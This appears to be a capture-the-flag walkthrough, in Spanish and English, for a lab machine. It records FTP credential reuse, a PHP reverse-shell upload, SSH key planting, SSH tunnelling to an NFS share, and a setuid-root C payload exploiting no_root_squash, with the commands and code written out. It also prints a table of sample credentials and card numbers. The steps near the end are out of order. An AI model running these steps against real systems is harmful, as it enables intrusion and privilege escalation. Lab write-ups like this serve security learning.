
# SCAN
```
PORT   STATE SERVICE VERSION                                                                                                                                 
21/tcp open  ftp     vsftpd 3.0.3                                                                                                                            
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)                                                                                                              
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix
```
# FTP SCAN

Anonymous not seems to be avalaible

# WEB ENUM
Hay un directorio **backups** donde hay un fichero comprimido *backup.zip* que contiene una clave publica (priv.key) y un archivo encriptado pgp: CustomerDetails.xlsx.gpg que parece contener un excel para desencriptar el fichero gpg, se hace en 2 pasos
1. Importar la clave privada
> $ gpg --import priv.key
2. Desencriptar
> $ gpg -d -o output.xlsx CustomerDetails.xlsx

In the file decrypted is a spreadsheet of excel with a table where the columns are: user, username, password, credit card number, cvs
```
Customer Name,Username,Password,Credit card number,CVC
Par. A. Doxx,paradox,ShibesAreGreat123,4111 1111 4555 1142,432
0day Montgomery,0day,OllieIsTheBestDog,5555 3412 4444 1115,642
Muir Land,muirlandoracle,A11D0gsAreAw3s0me,5103 2219 1119 9245,737
```

# FTP AUTHENTICATION
Trato de autentificarme en ftp con las anteriores credenciales pero solo lo logro con paradox. Resulta que puedo subir ficheros a este directorio
que es el directorio web, luego podre luego ejecutarlos. Puedo subir un reverse shell php (el tipico monkey). Ejecuto el fichero con curl y obtengo
un shell con el usuario apache (great!). Desde aqui es directo obtener el web-flag

# Escalada privilegios (user paradox)
Desde el usuario apache escalamos al usuario paradox mediante
> $ su paradox

Utilizando el mismo password

# user-flag (user james)
El hint nos dice que el flag de usuario pertenece al usuario **james**, pero no tengo acceso a su directorio. Utilizando alguna de las herramientas
de enumeracion automatica (lse, linpeas), veo que hay un vector para la escalada de privilegios que es que el directorio /home/james se puede montar 
como un nfs, es decir es un archivo compartido y como tiene activado el "root-no-squash" puedo subir al directorio /home/james un ejecutable con el cual
obtener un root. El problema es que desde dentro de la maquina no puedo acceder al directorio /home/james. 

# ssh tunneling
Puedo intentar hacer un ssh tunneling con la cual acceder al directorio /home/james ya que se que es un archivo compartido nfs y que utiliza el puerto 2049 aunque este puerto esta bloqueado por un firewall. Para este necesito:
1. Establecer una conexion ssh: Esto puedo hacerlo a traves del usuario paradox, creando una private-key y una public.key y traspasando la public key al directorio /home/paradox/.ssh/authorized_keys. Para ello en la maquina atacante:
- $ ssh-keygen -f paradox
2. copiamos echo "<content of public key>" >> /home/paradox/.ssh/authorized_keys
  
Ahora podemos abrir un ssh tunel con 
> $ ssh -i paradox -L 2049:127.0.0.1:2049 paradox@<ip_victim>

Ahora ya podemos montar la el archivo compartido nfs:

> $ mount -t nfs localhost:/ /tmp/mnt

y podemos acceder a los archivos compartidos con

 > $ cd /tmp/mnt
 
 Aqui preparamos nuestro payload e C:
 ```
 int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
 }
 
 lo compilamos con 
 > $ gcc payload.c -o payload
 y cambiamos a suid
 > $ chmod +s payload
 
 Nos logeamos como James con:
 > $ ssh -i id_rsa james@<ip_victim>
 y ejecutamos el exploit
 > $ ./payload
 y tenemos el root

 donde se haya el user.flag. Este directorio resulta ser el /home/james y contiene el .ssh con id_rsa e id_rsa.pub. Nos copiamos el id_rsa y podemos autentificarnos
  

